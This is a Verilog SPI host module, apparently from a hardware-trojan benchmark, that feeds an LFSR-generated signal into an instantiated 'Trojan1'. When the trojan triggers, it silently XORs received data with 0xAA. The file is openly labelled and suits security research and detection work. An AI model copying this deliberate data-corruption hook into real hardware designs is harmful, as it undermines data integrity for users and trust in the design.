// SPI Host Circuit for Trojan1
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
module trojan1_spi_host #(
    parameter DATA_WIDTH = 8,     // SPI data width
    parameter CLK_DIV = 16,       // SPI clock divider
    parameter [19:0] R1_SEED = 20'hFACED  // Seed for r1 generation
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] tx_data,
    input wire tx_start,
    input wire spi_miso,
    output reg [DATA_WIDTH-1:0] rx_data,
    output reg spi_sclk,
    output reg spi_mosi,
    output reg spi_cs_n,
    output reg tx_done,
    output reg rx_valid
);

    // Trojan interface (fixed width)
    wire trojan_r1;
    wire trojan_trigger;
    
    // SPI control signals
    reg [DATA_WIDTH-1:0] tx_shift_reg;
    reg [DATA_WIDTH-1:0] rx_shift_reg;
    reg [$clog2(CLK_DIV)-1:0] clk_counter;
    reg [$clog2(DATA_WIDTH)-1:0] bit_counter;
    reg [2:0] spi_state;
    reg [19:0] r1_lfsr;
    reg sclk_enable;
    reg sclk_prev;
    
    // R1 signal generation using LFSR
    always @(posedge clk or posedge rst) begin
        if (rst)
            r1_lfsr <= R1_SEED;
        else if (tx_start || (spi_state != 3'b000))
            r1_lfsr <= {r1_lfsr[18:0], r1_lfsr[19] ^ r1_lfsr[16] ^ r1_lfsr[13] ^ r1_lfsr[1]};
    end
    
    assign trojan_r1 = r1_lfsr[0];
    
    // SPI clock generation with proper 50% duty cycle
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            clk_counter <= {$clog2(CLK_DIV){1'b0}};
            spi_sclk <= 1'b0;
        end else if (sclk_enable) begin
            // Toggle clock every CLK_DIV/2 cycles for 50% duty cycle
            if (clk_counter >= $clog2(CLK_DIV)'((CLK_DIV/2)-1)) begin
                clk_counter <= {$clog2(CLK_DIV){1'b0}};
                spi_sclk <= ~spi_sclk;
            end else begin
                clk_counter <= clk_counter + 1;
            end
        end else begin
            clk_counter <= {$clog2(CLK_DIV){1'b0}};
            spi_sclk <= 1'b0;
        end
    end
    
    // Separate sclk_prev update for stable edge detection
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            sclk_prev <= 1'b0;
        end else begin
            sclk_prev <= spi_sclk;
        end
    end
    
    wire sclk_rising = sclk_enable && !sclk_prev && spi_sclk;
    wire sclk_falling = sclk_enable && sclk_prev && !spi_sclk;
    
    // SPI state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            spi_state <= 3'b000;
            spi_cs_n <= 1'b1;
            sclk_enable <= 1'b0;
            bit_counter <= {$clog2(DATA_WIDTH){1'b0}};
            tx_done <= 1'b0;
        end else begin
            case (spi_state)
                3'b000: begin // IDLE
                    spi_cs_n <= 1'b1;
                    sclk_enable <= 1'b0;
                    tx_done <= 1'b0;
                    if (tx_start) begin
                        tx_shift_reg <= tx_data;
                        bit_counter <= {$clog2(DATA_WIDTH){1'b0}};
                        spi_state <= 3'b001;
                    end
                end
                3'b001: begin // START
                    spi_cs_n <= 1'b0;
                    sclk_enable <= 1'b1;
                    spi_state <= 3'b010;
                end
                3'b010: begin // TRANSFER
                    if (sclk_rising) begin // Rising edge - output data
                        spi_mosi <= tx_shift_reg[DATA_WIDTH-1];
                        tx_shift_reg <= tx_shift_reg << 1;
                    end else if (sclk_falling) begin // Falling edge - sample and count
                        rx_shift_reg <= {rx_shift_reg[DATA_WIDTH-2:0], spi_miso};
                        if (bit_counter >= $clog2(DATA_WIDTH)'(DATA_WIDTH-1)) begin
                            spi_state <= 3'b011;
                        end else begin
                            bit_counter <= bit_counter + 1;
                        end
                    end
                end
                3'b011: begin // FINISH
                    spi_cs_n <= 1'b1;
                    sclk_enable <= 1'b0;
                    tx_done <= 1'b1;
                    spi_state <= 3'b000;
                end
                default: spi_state <= 3'b000;
            endcase
        end
    end
    
    // Output data with trojan trigger integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            rx_data <= {DATA_WIDTH{1'b0}};
            rx_valid <= 1'b0;
        end else if (tx_done) begin
            // Mix received data with trojan trigger (proper width handling)
            if (DATA_WIDTH >= 8) begin
                rx_data <= rx_shift_reg ^ (trojan_trigger ? {{(DATA_WIDTH-8){1'b0}}, 8'hAA} : {DATA_WIDTH{1'b0}});
            end else begin
                rx_data <= rx_shift_reg ^ (trojan_trigger ? {DATA_WIDTH{1'b1}} : {DATA_WIDTH{1'b0}});
            end
            rx_valid <= 1'b1;
        end else begin
            rx_valid <= 1'b0;
        end
    end
    
    // Instantiate Trojan1
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

